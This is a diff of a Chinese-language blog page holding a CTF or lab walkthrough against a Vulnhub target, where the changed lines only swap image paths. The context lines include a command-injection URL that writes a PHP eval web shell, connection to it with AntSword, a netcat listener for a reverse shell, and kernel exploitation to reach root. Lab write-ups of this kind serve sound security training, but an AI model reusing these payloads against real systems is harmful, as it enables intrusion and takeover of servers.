@@ -491,13 +491,13 @@ if (!$conn)
 echo 
     &quot;Connected successfully&quot;; mysqli_close($conn);
 </code></pre><p>尝试使用这个账号密码登录一下</p>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/4.png" alt="查看这台主机开放的端口"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/4.png" alt="查看这台主机开放的端口"></p>
 <h3 id="上传木马获取靶机用户"><a href="#上传木马获取靶机用户" class="headerlink" title="上传木马获取靶机用户"></a>上传木马获取靶机用户</h3><p>除了上面通过命令注入观察寻找备注文件以外，还可以通过上传木马</p>
 <pre><code>
 http://192.168.113.154/site/busque.php?buscar=echo &#39;&lt;?php eval($_POST[&quot;hack&quot;]);&#39; &gt; hack.php
 
 </code></pre><p>通过蚁剑连接</p>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/5.png" alt="连接成功"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/5.png" alt="连接成功"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>由于靶机不支持nc -e，不过可以使用管道命令mkfifo，具体过程是以下步骤：</p>
 <ol>
 <li>将收到的输入写入fifo文件</li>
@@ -513,7 +513,7 @@ http://192.168.113.154/site/busque.php?buscar=echo &#39;&lt;?php eval($_POST[&qu
 <blockquote>
 <p>nc -nlvp  443</p>
 </blockquote>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/6.png" alt="反弹shell成功"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/6.png" alt="反弹shell成功"></p>
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看靶机内核版本和发行版本</p>
 <pre class=" language-text"><code class="language-text">$ uname -a
 
@@ -582,8 +582,8 @@ Shellcodes: No Results
 </blockquote>
 <p>通过蚁剑上传漏洞，或者也可以通过ftp上传</p>
 <p>运行hack程序，并执行，提取成功，其他像44298.c尝试了无法提取。</p>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/7.png" alt="提权成功"></p>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/8.png" alt="进入root目录并获取flag"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/7.png" alt="提权成功"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/8.png" alt="进入root目录并获取flag"></p>
 <p>路漫漫其修远兮，长途漫漫，继续加油</p>
 
             </div>
